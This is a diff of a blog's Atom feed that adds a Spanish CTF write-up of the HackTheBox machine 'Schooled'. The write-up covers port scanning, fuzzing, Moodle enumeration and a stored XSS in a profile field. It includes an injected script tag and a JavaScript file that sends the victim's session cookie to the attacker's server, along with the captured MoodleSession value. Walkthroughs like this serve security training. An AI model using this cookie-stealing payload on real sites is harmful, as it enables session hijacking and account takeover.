@@ -1,5 +1,809 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-09-29T13:39:04-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Photobomb (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html" rel="alternate" type="text/html" title="HackTheBox - Photobomb (easy)" /><published>2024-09-29T00:00:00-06:00</published><updated>2024-09-29T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-10-11T15:50:53-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Schooled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled.html" rel="alternate" type="text/html" title="HackTheBox - Schooled (medium)" /><published>2024-10-11T00:00:00-06:00</published><updated>2024-10-11T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/3e2a599fda2f510f3a5f2146fae928ee.png" />
+</p>
+
+<ul>
+  <li>Schooled is a medium difficulty FreeBSD machine that showcases two recently disclosed vulnerabilities affecting the Moodle platform (labeled CVE-2020-25627 and CVE-2020-14321), which have to be chained together in order to gain access as a <code class="language-plaintext highlighter-rouge">teacher</code> user, escalate privileges to a <code class="language-plaintext highlighter-rouge">manager</code> user and install a malicious plugin resulting in remote command execution. Cracking a hash obtained from the Moodle database allows SSH access to the system via password reuse. Privileges can then be escalated to <code class="language-plaintext highlighter-rouge">root</code> by installing a malicious package (which is possible due to <code class="language-plaintext highlighter-rouge">sudo</code> permissions and write access to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file).</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,33060 10.10.10.234 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-10 17:14 CST
+Nmap scan report <span class="k">for </span>10.10.10.234
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
+|_http-title: Schooled - A new kind of educational institute
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message<span class="s2">"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"</span>
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame.<span class="s2">"
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=10/10%Time=67085FCF%P=x86_64-pc-linux-gnu
+SF:%r(NULL,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\</span>
+SF:x0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HT
+SF:TPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0</span>
+SF:<span class="se">\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNS
+SF:VersionBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestT
+SF:CP,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\
+SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
+SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
+SF:\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(TerminalServerCo
+SF:okie,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TLSSessionReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>
+SF:0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20messa
+SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
+SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
+SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>0
+SF:5HY000<span class="s2">")%r(FourOhFourRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LPDStr
+SF:ing,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LDAPSearchReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0
+SF:b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20messag
+SF:e\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
+SF:x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\*</span>Parse<span class="se">\x</span>20error<span class="se">\x</span>20unserializing<span class="se">\x</span>20protobuf<span class="se">\x</span>
+SF:20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(SIPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r
+SF:(LANDesk-RC,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TerminalServer,9,"</span><span class="se">\x</span>05<span class="se">\</span>
+SF:0<span class="se">\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(Not
+SF:esRPC,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x
+SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
+SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>16Inv
+SF:alid<span class="se">\x</span>20message-frame<span class="se">\.\"\x</span>05HY000<span class="s2">")%r(ms-sql-s,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>
+SF:05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(afp,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01
+SF:<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000");
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+</span></code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Vamos a comenzar enumerando el puerto 80.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.234</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.234</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">46</span><span class="p">],</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="c1">#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/1.png" />
+</p>
+
+<ul>
+  <li>Vamos hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos algo interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ feroxbuster <span class="nt">-u</span> http://10.10.10.234
+                                                                                                                
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.234
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ <span class="nb">true</span>
+ 🏁  HTTP methods          │ <span class="o">[</span>GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
+404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
+301      GET        7l       20w      235c http://10.10.10.234/images <span class="o">=&gt;</span> http://10.10.10.234/images/
+301      GET        7l       20w      232c http://10.10.10.234/css <span class="o">=&gt;</span> http://10.10.10.234/css/
+301      GET        7l       20w      231c http://10.10.10.234/js <span class="o">=&gt;</span> http://10.10.10.234/js/
+200      GET       21l      138w     5935c http://10.10.10.234/images/logo_05.png
+200      GET       19l      100w     5832c http://10.10.10.234/images/logo_06.png
+200      GET      364l      668w     6108c http://10.10.10.234/css/responsive.css
+200      GET        3l       29w    16814c http://10.10.10.234/images/favicon.ico
+200      GET       24l      137w     7123c http://10.10.10.234/images/logo_03.png
+200      GET       26l       53w      437c http://10.10.10.234/js/01-custom-places-example.js
+200      GET       42l      306w    23349c http://10.10.10.234/images/testi_03.png
+200      GET        8l      246w     8395c http://10.10.10.234/js/timeline.min.js
+200      GET        4l      194w     8215c http://10.10.10.234/js/modernizer.js
+200      GET       15l      114w     5619c http://10.10.10.234/images/logo_01.png
+200      GET       22l      108w     5099c http://10.10.10.234/images/logo_02.png
+200      GET       24l      123w     7771c http://10.10.10.234/images/logo_04.png
+200      GET       36l      161w    12089c http://10.10.10.234/images/apple-touch-icon.png
+200      GET       58l      283w    21484c http://10.10.10.234/images/testi_02.png
+200      GET      461l     1555w    20750c http://10.10.10.234/index.html
+200      GET      364l     1095w    15997c http://10.10.10.234/teachers.html
+200      GET      357l     1352w    17784c http://10.10.10.234/about.html
+200      GET     1911l     7282w    57523c http://10.10.10.234/js/mapsed.js
+200      GET       11l      485w    52789c http://10.10.10.234/css/animate.min.css
+200      GET      338l     1778w   109546c http://10.10.10.234/images/parallax_04.jpg
+200      GET      509l     2620w   170217c http://10.10.10.234/images/slider-01.jpg
+200      GET       84l      358w    14211c http://10.10.10.234/images/img-01.jpg
+200      GET       35l      179w     5340c http://10.10.10.234/images/ajax-loader.gif
+200      GET       23l      147w    12279c http://10.10.10.234/images/avatar-02.jpg
+200      GET       10l       49w      575c http://10.10.10.234/images/arrow-left.svg
+200      GET       10l       49w      575c http://10.10.10.234/images/arrow-right.svg
+200      GET       30l      173w    11994c http://10.10.10.234/images/avatar-03.jpg
+200      GET       40l      180w    13328c http://10.10.10.234/images/author.jpg
+200      GET       23l      168w    11422c http://10.10.10.234/images/avatar-01.jpg
+200      GET        5l       50w     1366c http://10.10.10.234/images/search-icon.png
+200      GET       79l      287w    18516c http://10.10.10.234/images/img-03.jpg
+200      GET      104l      538w    21523c http://10.10.10.234/images/img-04.jpg
+200      GET       77l      348w    19095c http://10.10.10.234/images/img-02.jpg
+200      GET       60l      465w    39366c http://10.10.10.234/images/world-map.png
+200      GET       94l      573w    44104c http://10.10.10.234/images/blog_2.jpg
+200      GET       69l      405w    29844c http://10.10.10.234/images/blog_1.jpg
+200      GET       82l      369w    33799c http://10.10.10.234/images/about_03.jpg
+200      GET       89l      535w    40621c http://10.10.10.234/images/blog_5.jpg
+200      GET      144l      739w    44395c http://10.10.10.234/images/team-02.png
+200      GET      156l      932w    54249c http://10.10.10.234/images/team-04.png
+301      GET        7l       20w      234c http://10.10.10.234/fonts <span class="o">=&gt;</span> http://10.10.10.234/fonts/
+200      GET      212l     1045w    61692c http://10.10.10.234/images/team-01.png
+200      GET      115l      651w    59462c http://10.10.10.234/images/blog_6.jpg
+200      GET      538l     1359w    64664c http://10.10.10.234/images/banner.jpg
+200      GET      120l      846w    59608c http://10.10.10.234/images/about_02.jpg
+200      GET      114l      638w    56719c http://10.10.10.234/images/blog_3.jpg
+200      GET      110l      835w    63659c http://10.10.10.234/images/blog_4.jpg
+200      GET      200l     1040w    86799c http://10.10.10.234/images/blog_single.jpg
+200      GET        7l       48w     2558c http://10.10.10.234/images/prettyPhoto/light_rounded/btnPrevious.png
+200      GET        7l       54w     2072c http://10.10.10.234/images/prettyPhoto/default/default_thumb.png
+200      GET        5l       78w     5660c http://10.10.10.234/fonts/Flaticon.woff
+200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/light_rounded/default_thumbnail.gif
+200      GET       69l      357w     5822c http://10.10.10.234/fonts/Flaticon.eot
+200      GET       69l      354w     5637c http://10.10.10.234/fonts/Flaticon.ttf
+200      GET       29l      179w     3935c http://10.10.10.234/images/prettyPhoto/dark_square/loader.gif
+200      GET       16l       92w     6221c http://10.10.10.234/images/prettyPhoto/light_square/sprite.png
+200      GET        7l       48w     2558c http://10.10.10.234/images/prettyPhoto/light_square/btnPrevious.png
+200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/light_square/default_thumbnail.gif
+200      GET       29l      179w     3935c http://10.10.10.234/images/prettyPhoto/dark_rounded/loader.gif
+200      GET        4l       44w     1230c http://10.10.10.234/images/prettyPhoto/default/sprite_y.png
+200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/dark_square/default_thumbnail.gif
+200      GET       18l      102w     7258c http://10.10.10.234/images/prettyPhoto/light_rounded/sprite.png
+200      GET       12l       37w     2531c http://10.10.10.234/images/prettyPhoto/light_square/btnNext.png
+200      GET       29l      179w     3989c http://10.10.10.234/images/prettyPhoto/light_rounded/loader.gif
+200      GET       29l      179w     3989c http://10.10.10.234/images/prettyPhoto/light_square/loader.gif
+200      GET       12l       37w     2531c http://10.10.10.234/images/prettyPhoto/light_rounded/btnNext.png
+200      GET       16l       92w     6221c http://10.10.10.234/images/prettyPhoto/dark_square/sprite.png
+200      GET        3l        8w      181c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternTop.png
+200      GET        3l        9w      182c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternBottom.png
+200      GET       18l       95w     7558c http://10.10.10.234/images/prettyPhoto/facebook/sprite.png
+200      GET        7l       25w     1489c http://10.10.10.234/images/prettyPhoto/facebook/btnNext.png
+200      GET        7l       25w     1418c http://10.10.10.234/images/prettyPhoto/facebook/btnPrevious.png
+200      GET      138l     2312w    23972c http://10.10.10.234/fonts/Flaticon.svg
+200      GET        3l        8w      181c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternLeft.png
+200      GET        3l        9w      184c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternRight.png
+</code></pre></div></div>
+
+<h2 id="moodle">Moodle</h2>
+
+<ul>
+  <li>
+    <p>No vemos nada algo que podemos hacer es buscar si hay subdominios.</p>
+  </li>
+  <li>
+    <p>Encontramos <code class="language-plaintext highlighter-rouge">moodle</code> <a href="https://www.maximaformacion.es/blog-teleformacion/que-es-la-plataforma-moodle-y-para-que-sirve-2/">https://www.maximaformacion.es/blog-teleformacion/que-es-la-plataforma-moodle-y-para-que-sirve-2/</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hh</span><span class="o">=</span>20750 <span class="nt">-u</span> http://10.10.10.234 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.schooled.htb"</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://10.10.10.234/
+Total requests: 19966
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                        
+<span class="o">=====================================================================</span>
+
+000000162:   200        1 L      5 W        84 Ch       <span class="s2">"moodle"</span>                  
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.234 moodle.schooled.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.10.234 moodle.schooled.htb
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/2.png" />
+</p>
+
+<ul>
+  <li>Si queremos hacer algo en el <code class="language-plaintext highlighter-rouge">Moodle</code> nos pide iniciar sesión.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/3.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Si buscamos como enumerar un <code class="language-plaintext highlighter-rouge">Moodle</code> encontramos el siguiente recurso <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/moodle">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/moodle</a>.</p>
+  </li>
+  <li>
+    <p>Vemos que solo encontramos la siguiente información <a href="https://github.com/SamJoan/droopescan">https://github.com/SamJoan/droopescan</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./droopescan scan moodle <span class="nt">-u</span> http://moodle.schooled.htb/moodle
+<span class="o">[</span>+] Plugins found:                                                              
+    forum http://moodle.schooled.htb/moodle/mod/forum/
+        http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
+        http://moodle.schooled.htb/moodle/mod/forum/version.php
+
+<span class="o">[</span>+] No themes found.
+
+<span class="o">[</span>+] Possible version<span class="o">(</span>s<span class="o">)</span>:
+    3.10.0-beta
+
+<span class="o">[</span>+] Possible interesting urls found:
+    Static readme file. - http://moodle.schooled.htb/moodle/README.txt
+    Admin panel - http://moodle.schooled.htb/moodle/login/
+
+<span class="o">[</span>+] Scan finished <span class="o">(</span>0:00:08.210147 elapsed<span class="o">)</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li>Para poder enumerar mas a fondo vamos a registrarnos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/4.png" />
+</p>
+
+<ul>
+  <li>Vemos que nos da un error y nos dice que solo acepta correos de ese dominio.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/5.png" />
+</p>
+
+<ul>
+  <li>Una vez creada la cuenta vemos lo siguiente.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/6.png" />
+</p>
+
+<ul>
+  <li>Si nos inscribimos a un curso encontramos muchos participantes.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/7.png" />
+</p>
+
+<ul>
+  <li>Si vamos a los <strong>Reminders</strong> vemos que Manuel Philips nos deja esto.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/8.png" />
+</p>
+
+<ul>
+  <li>Nos dice que necesitamos un <code class="language-plaintext highlighter-rouge">MoodleNet</code> Profile <a href="https://moodle.com/es/news/moodlenet-what-is-a-federated-social-network/">https://moodle.com/es/news/moodlenet-what-is-a-federated-social-network/</a>.</li>
+</ul>
+
+<h2 id="shell-as-www">Shell as www</h2>
+
+<ul>
+  <li>
+    <p>Si buscamos alguna vulnerabilidad relacionada con esto, en la pagina de <code class="language-plaintext highlighter-rouge">moodle</code> nos comparten que es posible hacer un XSS mediante un parámetro en el <code class="language-plaintext highlighter-rouge">user profile</code> <a href="https://moodle.org/mod/forum/discuss.php?d=410839#p1657001">https://moodle.org/mod/forum/discuss.php?d=410839#p1657001</a>.</p>
+  </li>
+  <li>
+    <p>Si nos vamos a editar nuestro perfil encontramos una parte donde nos dice <code class="language-plaintext highlighter-rouge">MoodleNet profile</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/9.png" />
+</p>
+
+<ul>
+  <li>Como es un XSS <a href="https://book.hacktricks.xyz/es/pentesting-web/xss-cross-site-scripting">https://book.hacktricks.xyz/es/pentesting-web/xss-cross-site-scripting</a> vamos a insertar una etiqueta para ver si obtenemos una petición a nuestro servidor.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"http://10.10.14.13/GG.js"</span><span class="o">&gt;</span>&lt;/script&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/10.png" />
+</p>
+
+<ul>
+  <li>Si le damos a <code class="language-plaintext highlighter-rouge">Update Profile</code> obtenemos la petición.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:16:00] code 404, message File not found
+10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:16:00] <span class="s2">"GET /GG.js HTTP/1.1"</span> 404 -
+10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:16:10] code 404, message File not found
+10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:16:10] <span class="s2">"GET /GG.js HTTP/1.1"</span> 404 -
+</code></pre></div></div>
+
+<ul>
+  <li>Con esta vulnerabilidad podemos robar Cookies de sesión podemos hacer un <code class="language-plaintext highlighter-rouge">.js</code> que haga un <code class="language-plaintext highlighter-rouge">request</code> de la <code class="language-plaintext highlighter-rouge">cookie</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>GG.js
+var request <span class="o">=</span> new XMLHttpRequest<span class="o">()</span><span class="p">;</span>
+request.open<span class="o">(</span><span class="s1">'GET'</span>, <span class="s1">'http://10.10.14.13/?cookie='</span> + document.cookie<span class="o">)</span><span class="p">;</span>
+request.send<span class="o">()</span><span class="p">;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a volver a inyectar la misma etiqueta para ver si nos llega una <code class="language-plaintext highlighter-rouge">Cookie</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:22:23] <span class="s2">"GET /GG.js HTTP/1.1"</span> 200 -
+10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:22:23] <span class="s2">"GET /?cookie=MoodleSession=f0f3evpeu3u7bmj1ves48hfrt4 HTTP/1.1"</span> 200 -
